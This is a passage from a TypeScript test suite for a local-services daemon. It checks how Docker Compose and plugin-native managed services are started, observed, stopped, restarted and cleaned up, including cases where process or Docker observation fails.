        } finally { unavailable = false; settled = true; }
    });

    it('retains incomplete cleanup when an admitted starter ran but Docker lost observation before capturing an identity', async () => {
        const h = await fixture(false, { kind: 'native', tool: 'compose', file: 'compose.yaml', target: 'worker' });
        await writeFile(join(h.root, 'compose.yaml'), 'services:\n  worker:\n    image: alpine:3.22\n');
        // OS executable boundary: a finite successful starter, with real host
        // process custody. Docker observation is independently unavailable afterwards.
        h.setNativeTool({ executablePath: process.execPath, args: ['-e', 'process.exit(0)', '--'] });
        let lists = 0;
        let recovered = false;
        Object.assign(h.runtime, { environmentIo: { ...h.runtime.environmentIo, async run(request: Parameters<ProjectFiniteActionRuntime['environmentIo']['run']>[0]) {
            if (request.args.includes('info')) return { exitCode: 0, stdout: JSON.stringify({ ID: 'test-compose-engine', OperatingSystem: 'Linux' }) };
            if (request.args.includes('ps') && ++lists > 2 && !recovered) return {
                exitCode: 1, stdout: '', stderr: 'permission denied while trying to connect to the docker API at unix:///var/run/docker.sock',
            };
            return { exitCode: 0, stdout: '' };
        } } });
        const review = await h.selectStart();
        if (!review.reviewedEffectDigest) throw new Error(`Expected Compose effect review: ${JSON.stringify(review)}`);
        try {
            const started = await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context);
            expect(started).toMatchObject({ status: 'succeeded' });
            const handle = h.owner.listProjectServices()[0];
            if (!handle) throw new Error('Expected retained uncertain native resource');
            await expect(handle.stop()).rejects.toMatchObject({ code: 'plugin_managed_server_termination_incomplete' });
            expect(h.owner.listProjectServices()).toEqual([handle]);
        } finally { recovered = true; }
    });

    it('releases native custody when the OS never gave the starter a process identity', async () => {
        // The macOS host path directly spawns the target. Linux systemd-run may
        // acquire a launcher PID even when the target executable is missing.
        const h = await fixture(false, { kind: 'native', tool: 'compose', file: 'compose.yaml', target: 'worker' }, true, undefined, 'home', 'home', 'darwin');
        await writeFile(join(h.root, 'compose.yaml'), 'services:\n  worker:\n    image: alpine:3.22\n');
        h.setNativeTool({ executablePath: `${h.root}-removed-docker` });
        // The resolved tool was removed at the OS boundary after prerequisite
        // inspection. An actual failed spawn produces no PID or native resource.
        let lists = 0;
        let recovered = false;
        Object.assign(h.runtime, { environmentIo: { ...h.runtime.environmentIo, async run(request: Parameters<ProjectFiniteActionRuntime['environmentIo']['run']>[0]) {
            if (request.args.includes('info')) return { exitCode: 0, stdout: JSON.stringify({ ID: 'test-compose-engine', OperatingSystem: 'Linux' }) };
            if (request.args.includes('ps') && ++lists > 2 && !recovered) return { exitCode: 1, stdout: '', stderr: 'permission denied' };
            return { exitCode: 0, stdout: '' };
        } } });
        const review = await h.selectStart();
        if (!review.reviewedEffectDigest) throw new Error(`Expected Compose effect review: ${JSON.stringify(review)}`);
        try {
            const started = await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context);
            expect(started.status).toBe('failed');
            expect(h.owner.listProjectServices()).toEqual([]);
            expect(h.owner.readRetainedSemanticCustodyCount()).toBe(0);
        } finally { recovered = true; }
    });

    it.skipIf(!process.env.FX16_DOCKER_PATH)('qualifies installed detached Compose through declaration admission, observation and exact Stop', async () => {
        const h = await fixture(false, { kind: 'native', tool: 'compose', file: 'compose.yaml', target: 'worker' });
        await writeFile(join(h.root, 'compose.yaml'), 'services:\n  worker:\n    image: alpine:3.22\n    command: [sh, -c, "echo fx16-service-output; echo fx16-service-error >&2; exec sleep 3600"]\n');
        h.setNativeTool({ executablePath: process.env.FX16_DOCKER_PATH!, args: JSON.parse(process.env.FX16_DOCKER_ARGS ?? '[]') });
        const review = LocalServiceStartApprovalReviewV1Schema.parse(await h.starter.prepareStartApproval(h.request, h.ingress, h.context));
        expect(review).toMatchObject({ reviewedEffectDigest: expect.any(String) });
        const effect = review.reviewedEffect;
        if (!effect || typeof effect !== 'object' || !('command' in effect) || !effect.command || typeof effect.command !== 'object' || !('args' in effect.command)
            || !Array.isArray(effect.command.args) || !effect.command.args.every((arg: unknown) => typeof arg === 'string')) throw new Error('Expected reviewed native argv');
        const nativeArgs = effect.command.args;
        // The reviewed resolved tuple already includes the installed tool's prefix.
        const cleanupArgs = [...nativeArgs.slice(0, nativeArgs.indexOf('up')), 'down'];
        try {
            const started = await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context);
            expect(started).toMatchObject({ status: 'succeeded' });
            const handle = h.owner.listProjectServices()[0]!;
            expect(handle.snapshot()).toMatchObject({ state: 'running', mode: 'native', baseUrl: null });
            expect(handle.snapshot().diagnostics).toContainEqual(expect.objectContaining({ code: 'native_service_output', message: expect.stringContaining('fx16-service-error') }));
            expect(h.setupProcesses).toEqual([]);
            const feed = await h.routes.getSnapshot();
            expect(feed.targets).toContainEqual(expect.objectContaining({ source: 'managed_service', serviceState: 'running' }));
            expect(feed.targets.find(target => target.sourceClass?.kind === 'managed_service')?.endpointUrl).toBeUndefined();
            try { await handle.stop(); }
            catch (error) { throw new Error(`Native Stop failed: ${JSON.stringify(handle.snapshot())}`, { cause: error }); }
            expect(handle.snapshot()).toMatchObject({ state: 'stopped' });
            // A fresh owner binding adopts an already-detached survivor without
            // another starter. This is the daemon-crash recovery boundary, not
            // graceful owner disposal (which intentionally stops owned services).
            expect((await h.runtime.environmentIo.run({ command: process.env.FX16_DOCKER_PATH!,
                args: nativeArgs, cwd: h.root, env: {} })).exitCode).toBe(0);
            const recovered = await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context);
            expect(recovered).toMatchObject({ status: 'succeeded' });
            const recoveredHandle = h.owner.listProjectServices()[0]!;
            expect(recoveredHandle.snapshot()).toMatchObject({ state: 'running', mode: 'native', pid: null, baseUrl: null });
            expect(recoveredHandle.instanceId).not.toBe(handle.instanceId);
            expect(await recoveredHandle.stop()).toEqual({ status: 'stopped' });
        } finally {
            // The fixture's exact reviewed native project owns containers/networks.
            // Down preserves volumes and cannot address another lane's project.
            const cleanup = await h.runtime.environmentIo.run({ command: process.env.FX16_DOCKER_PATH!, args: cleanupArgs, cwd: h.root, env: {} });
            expect(cleanup.exitCode).toBe(0);
            const project = nativeArgs[nativeArgs.indexOf('--project-name') + 1];
            for (const args of [['ps', '--all'], ['network', 'ls']]) {
                const inventory = await h.runtime.environmentIo.run({ command: process.env.FX16_DOCKER_PATH!,
                    args: [...JSON.parse(process.env.FX16_DOCKER_ARGS ?? '[]'), ...args, '--filter', `label=com.docker.compose.project=${project}`, '--format', '{{.ID}}'], cwd: h.root, env: {} });
                expect(inventory.exitCode).toBe(0);
                expect(inventory.stdout.trim()).toBe('');
            }
            await h.owner.listProjectServices()[0]?.stop();
        }
    }, 120_000);

    it.each(['foreground_native_service', 'no_setup_live_root', 'no_setup_worker', 'retired_worker', 'setup_live_root', 'setup_exited_root_with_live_descendant', 'no_setup_with_native_helper', 'pre_final_native_helper', 'detached_native_resource', 'detached_native_resource_without_output', 'detached_native_resource_failure_output', 'detached_native_resource_accepted_stop', 'detached_native_resource_accepted_stop_worker'] as const)('retains the actual selected plugin environment through Service Start and unconfirmed Stop until owned tree settlement (%s)', async fixtureKind => {
        const detachedNative = fixtureKind.startsWith('detached_native_resource');
        const foregroundNative = fixtureKind === 'foreground_native_service';
        let acceptedNativeStop = fixtureKind.includes('accepted_stop');
        const withSetup = fixtureKind.startsWith('setup_');
        const preFinalHelper = fixtureKind === 'pre_final_native_helper';
        const withNativeHelper = fixtureKind === 'no_setup_with_native_helper' || preFinalHelper;
        const exitedRoot = fixtureKind === 'setup_exited_root_with_live_descendant';
        if (exitedRoot && process.platform === 'win32') return;
        const worker = fixtureKind.endsWith('_worker');
        const h = await fixture(withSetup, undefined, true, worker ? 'portable' : undefined);
        const configContent = '[tasks]\ncheck = "echo checked"';
        await writeFile(join(h.root, 'pixi.toml'), configContent);
        const pidPath = join(h.targetRoot, 'native-tree.json');
        const treeScript = [
            'const { spawn } = require("node:child_process"); const fs = require("node:fs");',
            'const child = spawn(process.execPath, ["-e", "setInterval(() => {}, 1000)"], { stdio: "ignore" }); child.unref();',
            `fs.writeFileSync(${JSON.stringify(pidPath)}, JSON.stringify({ parentPid: process.pid, childPid: child.pid }));`,
            'setInterval(() => {}, 1000);',
        ].join(' ');
        const manifest = detachedNative || foregroundNative ? { ...h.manifest, services: { worker: {
            source: { kind: 'pluginNative', adapter: pixiAdapter, file: 'pixi.toml', target: 'check' },
            ...(worker ? { execution: 'portable' } : {}),
        } } } : !exitedRoot ? h.manifest : { ...h.manifest, services: { worker: {
            source: { kind: 'command', command: `exec ${JSON.stringify(process.execPath)} -e ${JSON.stringify(treeScript)}` },
        } } };
        await writeFile(join(h.root, '.happier/project.json'), JSON.stringify({ ...manifest, toolchain: importedPixiToolchain }));
        const ingested = ingestCanonicalPluginManifest(pixiPlugin.manifest, { sourceProvenance: 'registryCustodied' });
        if (!ingested.ok) throw new Error('Expected admitted public native fixture');
        const environmentObservation: { signal?: AbortSignal } = {};
        let nativeHelper: Awaited<ReturnType<PluginInvocationContext['services']['exec']['spawn']>> | undefined;
        const nativeInstance: ManagedServiceNativeInstanceV1 = { adapter: pixiAdapter, nativeResourceId: 'observed-external-service-instance' };
        let nativeStopped = false;
        let nativeObservation: 'known' | 'unknown' | 'failed' = 'known';
        let nativeOutputReads = 0;
        function nativeLogs(instance: ManagedServiceNativeInstanceV1, options: ManagedServiceNativeLogReadV1, context?: PluginInvocationContext): Promise<ManagedServiceNativeLogResultV1>;
        function nativeLogs(instance: ManagedServiceNativeInstanceV1, options: ManagedServiceNativeLogWatchV1, context?: PluginInvocationContext): Promise<Disposable>;
        async function nativeLogs(instance: ManagedServiceNativeInstanceV1, options: ManagedServiceNativeLogReadV1 | ManagedServiceNativeLogWatchV1, context?: PluginInvocationContext): Promise<ManagedServiceNativeLogResultV1 | Disposable> {
            expect(instance).toEqual(nativeInstance);
            expect(options.maxBytes).toBe(8_192);
            if (!context) throw new Error('Native output lost admitted invocation services');
            if (options.kind === 'watch') {
                options.emit({ kind: 'unavailable', reason: 'unsupported' });
                return { dispose() {} };
            }
            nativeOutputReads += 1;
            const bytes = await context.services.fs.readFile({ root: 'workspace', relativePath: 'pixi.toml' });
            return { kind: 'page' as const, page: { sourceRevision: instance.nativeResourceId,
                text: `native output: ${new TextDecoder().decode(bytes)}`, nextCursor: null, truncated: false } };
        }
        const stoppedResources: ManagedServiceNativeInstanceV1[] = [];
        const installedToolPath = join(h.root, process.platform === 'win32' ? 'pixi.exe' : 'pixi');
        if (withNativeHelper || detachedNative || foregroundNative) {
            await copyFile(process.execPath, installedToolPath);
            if (process.platform !== 'win32') await chmod(installedToolPath, 0o755);
        }
        const targets = [{ provenance: 'first_party' as const, source: { kind: 'bundled' as const }, pluginId: pixiAdapter.pluginId,
            manifestPath: '/virtual/pixi/plugin.json', daemonEntryPath: '/virtual/pixi/daemon.mjs',
            sourceSpec: { kind: 'package' as const, locator: '@acme/pixi', trustPolicy: 'local_trusted' as const, installPolicy: 'copy' as const },
            activationEvents: [], manifest: ingested.manifest }];
        const inputs = projectLoadedPluginContributes({ provenance: 'first_party', loadResult: { loadedPlugins: [{
            pluginId: pixiAdapter.pluginId, pluginRootPath: h.root, manifestPath: targets[0]!.manifestPath,
            daemonEntryPath: targets[0]!.daemonEntryPath, devDaemonEntryPath: null, sourceSpec: targets[0]!.sourceSpec, manifest: ingested.manifest,
        }], diagnosticsByPluginId: {} } });
        const contributes = createResolvedContributionRegistry({ ...inputs, activationTargets: targets });
        // The plugin module loader is a boundary; registration, native admission,
        // invocation services and managed process custody remain their real owners.
        const activateRegistry = () => {
            const occurrenceId = createPluginRuntimeOccurrenceId(pixiAdapter.pluginId);
            return activatePluginRuntimeRegistry({ contributes, occurrenceIdsByPluginId: new Map([[pixiAdapter.pluginId, occurrenceId]]),
            // Each fixture supplies distinct closure-backed module bytes, not
            // another load of the same globally cached bundled module.
            generation: 1, resolveActivationSource: () => ({ kind: 'bundled', moduleId: `@acme/pixi/service-native-lifetime/${occurrenceId}`, load: async () => ({
                activate(api: PluginApi) {
                    api.projectNativeAdapters.register(pixiAdapter.localId, {
                        ...pixiRuntime,
                        ...(detachedNative || foregroundNative ? {
                            async resolveCommand(request: Parameters<NonNullable<typeof pixiRuntime.resolveCommand>>[0]) {
                                return { kind: 'resolved' as const, executable: { kind: 'systemTool' as const, id: 'pixi' },
                                    args: ['-e', foregroundNative ? treeScript : `require('node:fs').writeFileSync(${JSON.stringify(pidPath)}, String(process.pid)); process.exit(0)`],
                                    cwd: request.root, reviewInputs: request.files, ...(detachedNative ? { nativeInstance } : {}) };
                            },
                            ...(detachedNative ? { nativeServiceLifecycle: {
                                ...(fixtureKind === 'detached_native_resource_without_output' ? {} : { logs: nativeLogs }),
                                async inspect(instance: typeof nativeInstance, _options, context) {
                                    expect(instance).toEqual(nativeInstance);
                                    if (!context) throw new Error('Native lifecycle lost admitted invocation services');
                                    const bytes = await context.services.fs.readFile({ root: 'workspace', relativePath: 'pixi.toml' });
                                    expect(new TextDecoder().decode(bytes)).toBe(configContent);
                                    if (nativeObservation === 'failed') throw Object.assign(new Error('Native resource inspection is unavailable'), { code: 'EIO' });
                                    return { phase: nativeObservation === 'unknown' ? 'unknown' as const
                                        : nativeStopped ? 'stopped' as const : 'running' as const, readiness: 'not_reported' as const, endpoint: null };
                                },
                                async stop(instance: typeof nativeInstance, _options, context) {
                                    if (!context) throw new Error('Native Stop lost admitted invocation services');
                                    stoppedResources.push(instance);
                                    return { status: nativeStopped && !acceptedNativeStop ? 'stopped' as const : 'accepted' as const };
                                },
                            } } : {}),
                        } : {}),
                        async prepareToolchain(request, context) {
                            environmentObservation.signal = context.signal;
                            const bytes = await context.services.fs.readFile({ root: 'workspace', relativePath: 'pixi.toml' });
                            if (new TextDecoder().decode(bytes) !== configContent) throw new Error('Selected environment lost actual reviewed root');
                            if (withNativeHelper && request.launch) {
                                nativeHelper = await context.services.exec.spawn({ executable: { kind: 'systemTool', id: 'pixi' },
                                    args: ['-e', 'setInterval(() => {}, 1000)'], cwd: { root: 'workspace', relativePath: '' } });
                                if (preFinalHelper) await nativeHelper.dispose();
                            }
                            // Preparation can request only environment evaluation;
                            // this fixture's native environment has no extra variables.
                            return { kind: 'ready', env: request.launch?.env ?? {}, reviewInputs: request.files };
                        },
                    });
                },
            }) }) });
        };
        let registry = await activateRegistry();
        const toolResolution = createDaemonSpawnToolResolutionContext({ processEnv: { PATH: h.root, PATHEXT: '.EXE' } });
        const owners = createProductionPluginInvocationServiceOwners({ loggerSink: { write() {} }, exec: {
            resolvePath: async () => h.root,
            resolveExecutable: async reference => {
                if ((!withNativeHelper && !detachedNative && !foregroundNative) || reference.kind !== 'systemTool' || reference.id !== 'pixi') throw new Error('This environment does not launch a native wrapper');
                const resolved = await toolResolution.resolveSystemTool({ toolId: 'pixi', lookupNames: ['pixi'], reason: 'Resolve actual installed native helper fixture' });
                if (!resolved.ok) throw new Error(resolved.reasonCode);
                return { command: resolved.command, args: resolved.args };
            },
        } });
        cleanups.push(async () => { await nativeHelper?.dispose(); });
        cleanups.push(async () => { await registry.dispose(); await owners.dispose(); });
        const plugins: NonNullable<ProjectFiniteActionRuntime['plugins']> = { resolveProjectNativeAdapter(reference, role) {
            return resolveProjectNativeAdapter({ reference, role, targets, registry, createInvocationContext(input) {
                const lifetime = createPluginInvocationLifetime(input.signal);
                const seed = { plugin: { id: pixiAdapter.pluginId, version: ingested.manifest.version },
                    contribution: { id: pixiAdapter.localId, qualifiedId: `${pixiAdapter.pluginId}/projectNativeAdapters/${pixiAdapter.localId}` },
                    occurrenceId: input.occurrenceId, correlationId: 'service-native-environment', surface: 'cli' as const,
                    signal: lifetime.signal, redactionLifetimeSignal: lifetime.redactionLifetimeSignal,
                    isOccurrenceCurrent: () => !lifetime.signal.aborted && input.isCurrent() };
                const hostAccessRequests = resolveManifestHostAccessRequestsForQualifiedContribution({ manifest: ingested.manifest,
                    pluginId: pixiAdapter.pluginId, contribution: seed.contribution });
                if (!hostAccessRequests) { lifetime.complete(); throw new Error('Selected environment lost declared HostAccess'); }
                try {
                    return { context: { ...seed, invokedAtMs: lifetime.invokedAtMs, services: owners.createOperationServices(seed, {
                        filesystemRoots: { pluginData: h.root, workspace: input.root, projects: new Map<string, string>() },
                        environment: input.environment ?? {}, hostAccessRequests,
                    }) }, complete: lifetime.complete };
                } catch (error) { lifetime.complete(); throw error; }
            } });
        } };
        Object.assign(h.runtime, { plugins });
        const setupReview = await h.routes.startTarget!(h.request, h.ingress, h.context);
        expect(setupReview).toMatchObject({ status: 'denied', reasonCode: 'project_setup_consent_required', reviewedEffectDigest: expect.any(String) });
        if (!setupReview.reviewedEffectDigest) throw new Error('Expected actual setup environment review');
        // The genuine Home boundary now returns the existing approving-Account
        // Trust row, not a Service waiver or fabricated human authority.
        h.trustSetupDigest(setupReview.reviewedEffectDigest);
        const review = await h.selectStart();
        expect(review).toMatchObject({ reviewedEffectDigest: expect.any(String) });
        expect(environmentObservation.signal).toBeUndefined();
        if (!review.reviewedEffectDigest) throw new Error('Expected actual Service environment review');
        if (fixtureKind === 'retired_worker') {
            await registry.dispose();
            expect(await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context))
                .toMatchObject({ status: 'denied', reasonCode: 'native_adapter_retired' });
            expect(h.owner.listProjectServices()).toEqual([]);
            expect(environmentObservation.signal).toBeUndefined();
            return;
        }
        let preFinalTerminationAttempts = 0;
        const originalTerminate = processTreeBoundary.terminateProcessTree;
        const preFinalTermination = preFinalHelper ? vi.spyOn(processTreeBoundary, 'terminateProcessTree').mockImplementation(async (...args) => {
            preFinalTerminationAttempts++;
            if (preFinalTerminationAttempts === 1) throw new Error('OS could not prove pre-final native helper settlement');
            await originalTerminate(...args);
        }) : undefined;
        const completion = h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context);
        if (preFinalHelper) {
            let startFinished = false;
            void completion.then(() => { startFinished = true; }, () => { startFinished = true; });
            let retirement: Promise<void> | undefined;
            try {
                await expect.poll(() => preFinalTerminationAttempts).toBe(1);
                const pid = nativeHelper && readSupervisedPluginProcessIdForHost(nativeHelper);
                if (!pid) throw new Error('Expected actual pre-final selected native helper');
                expect(process.kill(pid, 0)).toBe(true);
                expect(startFinished).toBe(false);
                expect(environmentObservation.signal?.aborted).toBe(false);
                expect(h.owner.listProjectServices()).toEqual([]);
                expect(h.owner.readRetainedSemanticCustodyCount()).toBeGreaterThan(0);
                // Before a Project handle is published, final retirement is
                // the existing semantic-entry Stop ingress, not a new API.
                retirement = h.owner.retireProjectServices();
                await expect.poll(() => preFinalTerminationAttempts).toBeGreaterThan(1);
                await retirement;
                await completion;
                expect(() => process.kill(pid, 0)).toThrow();
                expect(environmentObservation.signal?.aborted).toBe(true);
                expect(h.owner.readRetainedSemanticCustodyCount()).toBe(0);
            } finally {
                preFinalTermination?.mockRestore();
                // Genuine Exec cleanup settles the boundary even on RED.
                await nativeHelper?.dispose();
                await completion.catch(() => undefined);
                await retirement?.catch(() => undefined);
            }
            return;
        }
        if (withSetup) {
            const completed: { result?: Awaited<typeof completion> } = {};
            void completion.then(result => { completed.result = result; });
            await expect.poll(() => h.setupProcesses.length === 1 || completed.result !== undefined).toBe(true);
            if (completed.result) expect(completed.result.reasonCode).toBeUndefined();
            expect(h.setupProcesses.length).toBe(1);
            expect(h.owner.listProjectServices()).toEqual([]);
            h.setupProcesses[0]!.pty.exit(0);
        }
        const started = await completion;
        expect(started.reasonCode).toBeUndefined();
        expect(started).toMatchObject({ status: 'succeeded' });
        const startedHandle = h.owner.listProjectServices()[0];
        expect(startedHandle?.snapshot()).toMatchObject({ state: 'running' });
        expect(environmentObservation.signal?.aborted).toBe(false);
        if (!startedHandle) throw new Error('Expected actual owned Service');
        let handle = startedHandle;
        if (foregroundNative) {
            expect(handle.snapshot().mode).toBe('spawn');
            const original = handle;
            const originalEnvironmentSignal = environmentObservation.signal;
            const actionRoutes = createLocalServiceActionRoutes({ machineId: 'machine', projectManagedServices: h.owner,
                inventoryRegistry: createLocalServiceInventoryRegistry(), restartManagedService: h.starter.restartManagedService,
                prepareRestartManagedService: h.starter.prepareRestartManagedService,
                verifyConfirmationNonce: request => request.confirmationNonce === createLocalServiceActionConfirmationNonceV1(request) });
            const featureGate = createLocalServicesDaemonFeatureGate({ env: {}, resolveServerFeaturesSnapshot: () => ({ status: 'ready',
                features: FeaturesResponseSchema.parse({ features: { localServices: { enabled: true, inventory: { enabled: true },
                    managed: { enabled: true }, actions: { enabled: true }, launcher: { enabled: true } },
                    browser: { enabled: true, viewTargets: { enabled: true } } }, capabilities: {} }) }) });
            await featureGate.refresh();
            const executor: ReturnType<typeof createActionExecutor> = createActionExecutor({
                ...createCliActionDeps({ token: h.runtime.credentials.token, credentials: h.runtime.credentials,
                    serverId: 'home', serverHttpBaseUrl: 'https://home.example', sessionId: 'cli-global', mode: 'plain', ctx: null }),
                prepareHostReviewedChildren: createLocalServicesDaemonRestartPreparation({ featureGate, ingress: h.ingress,
                    routes: { launcherRoutes: h.routes, actionRoutes } }),
                prepareLocalServiceStartApproval: ({ input, context, executeCanonicalAction }) =>
                    h.routes.prepareStartApproval!(input, h.ingress, context, executeCanonicalAction),
                runtimeActionExecute: createLocalServicesDaemonRuntimeActionExecutor({ featureGate, ingress: h.ingress,
                    routes: { launcherRoutes: h.routes, actionRoutes } }) });
            const restart = async (requestId: string, expectedEffectDigest: string) => {
                const request = { requestId, action: 'restart_managed' as const, force: false, expectedEffectDigest,
                    target: { kind: 'managed_service' as const, machineId: 'machine', managedServiceId: original.instanceId,
                        workspaceId: h.workspace.id, declaration: h.request.declaration, cwd: h.root } };
                const result = await executor.execute('localServices.actions.restartManaged',
                    { ...request, confirmationNonce: createLocalServiceActionConfirmationNonceV1(request) },
                    // This scenario tests native lifetime, not Ask. The separate
                    // Restart policy cases below retain independent Start review.
                    { ...h.context, surface: 'rpc', actionRequestId: requestId,
                        actionsSettings: normalizeActionsSettingsV1({ v: 1, actions: {
                            'localServices.launcher.start': { approvalRequiredSurfaces: [] },
                        } }) });
                if (!result.ok) throw new Error(JSON.stringify(result));
                return result.result;
            };
            const changed = LocalServiceActionResultV1Schema.parse(await restart('plugin-native-restart-changed', 'f'.repeat(64)));
            expect(changed).toMatchObject({ status: 'denied', reasonCode: 'project_service_effect_changed' });
            expect(original.snapshot().state).toBe('running');
            expect(originalEnvironmentSignal?.aborted).toBe(false);
            if (!changed.reviewedEffectDigest) throw new Error('Expected current plugin Service effect review');
            const restarted = LocalServiceActionResultV1Schema.parse(await restart('plugin-native-restart', changed.reviewedEffectDigest));
            expect(restarted.reasonCode, JSON.stringify(restarted)).toBeUndefined();
            expect(restarted.status).toBe('succeeded');
            expect(original.snapshot().state).toBe('stopped');
            expect(originalEnvironmentSignal?.aborted).toBe(true);
            const replacement = h.owner.listProjectServices()[0];
            if (!replacement) throw new Error('Expected replacement plugin Service');
            handle = replacement;
            expect(handle.instanceId).not.toBe(original.instanceId);
            expect(handle.snapshot()).toMatchObject({ mode: 'spawn', state: 'running' });
            expect(environmentObservation.signal?.aborted).toBe(false);
        }
        if (detachedNative) {
            try {
                await expect.poll(async () => {
                    try { const pid = Number(await readFile(pidPath, 'utf8')); process.kill(pid, 0); return false; }
                    catch (error) { return error instanceof Error && 'code' in error && error.code === 'ESRCH'; }
                }).toBe(true);
                expect(handle.snapshot()).toMatchObject({ mode: 'native', state: 'running', baseUrl: null });
                expect(nativeOutputReads).toBe(0);
                if (fixtureKind === 'detached_native_resource_without_output') {
                    const output: ManagedServiceNativeLogResultV1[] = [];
                    if (!handle.watchLogs) throw new Error('Expected native log follow');
                    const subscription = await handle.watchLogs({ emit: result => { output.push(result); } });
                    expect(output).toEqual([{ kind: 'unavailable', reason: 'unsupported' }]);
                    await subscription.dispose();
                }
                if (fixtureKind === 'detached_native_resource_failure_output') {
                    nativeObservation = 'failed';
                    // Join the real watchdog's failure before checking the asynchronous diagnostic.
                    await vi.waitFor(() => expect(handle.snapshot().state).toBe('unhealthy'), {
                        timeout: MANAGED_SERVICE_NUMERIC_CONTRACT.healthIntervalMs.defaultValue * 2,
                    });
                    await vi.waitFor(() => expect(handle.snapshot().diagnostics).toContainEqual(
                        expect.objectContaining({ code: 'native_service_output', message: expect.stringContaining('native output:') })));
                    expect(nativeOutputReads).toBe(1);
                    nativeObservation = 'known';
                }
                await expect(handle.stop()).rejects.toMatchObject({ code: 'plugin_managed_server_termination_incomplete' });
                expect(handle.snapshot().state).not.toBe('stopped');
                expect(environmentObservation.signal?.aborted).toBe(false);
                await registry.dispose();
                nativeStopped = true;
                if (acceptedNativeStop) {
                    await expect(handle.stop()).rejects.toMatchObject({ code: 'plugin_managed_server_termination_incomplete' });
                    expect(handle.snapshot().state).not.toBe('stopped');
                    expect(h.owner.listProjectServices()).toEqual([handle]);
                    expect(h.owner.readRetainedSemanticCustodyCount()).toBeGreaterThan(0);
                    expect(environmentObservation.signal?.aborted).toBe(false);
                    registry = await activateRegistry();
                    const diagnostic = vi.spyOn(logger, 'warnLocalFile').mockImplementation(() => {});
                    try {
                        for (const uncertainty of ['failed', 'unknown'] as const) {
                            nativeObservation = uncertainty;
                            await expect(handle.stop()).rejects.toMatchObject({ code: 'plugin_managed_server_termination_incomplete' });
                            if (uncertainty === 'failed') expect(diagnostic).toHaveBeenCalledWith(expect.any(String), expect.objectContaining({
                                phase: 'project_service.stop.recover', errorCode: 'EIO',
                            }));
                            expect(h.owner.listProjectServices()).toEqual([handle]);
                            expect(stoppedResources).toEqual([nativeInstance, nativeInstance]);
                            expect(environmentObservation.signal?.aborted).toBe(false);
                        }
                    } finally { diagnostic.mockRestore(); }
                    nativeObservation = 'known';
                    nativeStopped = false;
                    await expect(handle.stop()).rejects.toMatchObject({ code: 'plugin_managed_server_termination_incomplete' });
                    expect(handle.snapshot().state).not.toBe('stopped');
                    expect(h.owner.readRetainedSemanticCustodyCount()).toBeGreaterThan(0);
                    expect(environmentObservation.signal?.aborted).toBe(false);
                    nativeStopped = true;
                }
                await expect(handle.stop()).resolves.toEqual({ status: 'stopped' });
                expect(stoppedResources).toEqual(acceptedNativeStop
                    ? [nativeInstance, nativeInstance, nativeInstance] : [nativeInstance, nativeInstance]);
                expect(handle.snapshot()).toMatchObject({ state: 'stopped', nativePhase: 'stopped' });
                expect(h.owner.listProjectServices()).toEqual([]);
                expect(environmentObservation.signal?.aborted).toBe(true);
                return;
            } finally {
                // Supply a definitive native stop for cleanup even if recovery is RED.
                nativeStopped = true;
                nativeObservation = 'known';
                acceptedNativeStop = false;
                await handle.stop();
            }
        }
        if (withNativeHelper) {
            const helperPid = nativeHelper && readSupervisedPluginProcessIdForHost(nativeHelper);
            if (!helperPid) throw new Error('Expected actual selected environment helper');
            let releaseHelper!: () => void;
            let rejectHelper!: (error: Error) => void;
            let helperStopStarted = false;
            let observeHelperStop!: () => void;
            const helperStopObserved = new Promise<void>(resolve => { observeHelperStop = resolve; });
            let stopFinished = false;
            const originalTerminate = processTreeBoundary.terminateProcessTree;
            const heldTermination = new Promise<void>((resolve, reject) => { releaseHelper = resolve; rejectHelper = reject; });
            const terminate = vi.spyOn(processTreeBoundary, 'terminateProcessTree').mockImplementation(async (...args) => {
                if (args[0].pid === helperPid && !helperStopStarted) {
                    helperStopStarted = true;
                    observeHelperStop();
                    await heldTermination;
                }
                await originalTerminate(...args);
            });
            const stop = handle.stop();
            void stop.then(() => { stopFinished = true; }, () => { stopFinished = true; });
            try {
                await Promise.race([helperStopObserved, stop.then(() => {
                    throw new Error('Service Stop settled before its selected helper termination');
                })]);
                expect(helperStopStarted).toBe(true);
                expect(stopFinished).toBe(false);
                expect(environmentObservation.signal?.aborted).toBe(false);
                expect(process.kill(helperPid, 0)).toBe(true);
                rejectHelper(new Error('OS could not prove selected native helper tree absent'));
                await expect(stop).rejects.toBeInstanceOf(Error);
                expect(environmentObservation.signal?.aborted).toBe(false);
                expect(process.kill(helperPid, 0)).toBe(true);
            } finally {
                releaseHelper();
                terminate.mockRestore();
                await nativeHelper?.dispose();
                await stop.catch(() => undefined);
            }
            await handle.stop();
            expect(h.owner.listProjectServices()).toEqual([]);
            expect(environmentObservation.signal?.aborted).toBe(true);
            return;
        }
        let capturedTree: Extract<Awaited<ReturnType<typeof processTreeBoundary.captureProcessTree>>, { status: 'ok' }> | undefined;
        const terminate = vi.spyOn(processTreeBoundary, 'terminateProcessTree').mockRejectedValue(new Error('OS tree termination could not be observed'));
        try {
            if (exitedRoot) {
                await expect.poll(async () => {
                    try { await readFile(pidPath, 'utf8'); return true; } catch { return false; }
                }).toBe(true);
                const pids: unknown = JSON.parse(await readFile(pidPath, 'utf8'));
                if (!pids || typeof pids !== 'object' || !('parentPid' in pids) || typeof pids.parentPid !== 'number'
                    || !('childPid' in pids) || typeof pids.childPid !== 'number') throw new Error('Expected actual OS tree identities');
                const parentPid = pids.parentPid;
                const childPid = pids.childPid;
                // The canonical identity-safe owner cannot discover survivors
                // from a departed numeric root. Retain exact fixture identities
                // before injecting that unexpected root exit for explicit cleanup.
                const captured = await processTreeBoundary.captureProcessTree({ pid: parentPid });
                expect(captured).toMatchObject({ status: 'ok', capturedTargets: expect.arrayContaining([expect.objectContaining({ pid: childPid })]) });
                if (captured.status !== 'ok') throw new Error('Expected observed fixture tree before root exit');
                capturedTree = captured;
                process.kill(parentPid, 'SIGKILL');
                await expect.poll(() => {
                    try { process.kill(parentPid, 0); return true; } catch { return false; }
                }).toBe(false);
                expect(() => process.kill(childPid, 0)).not.toThrow();
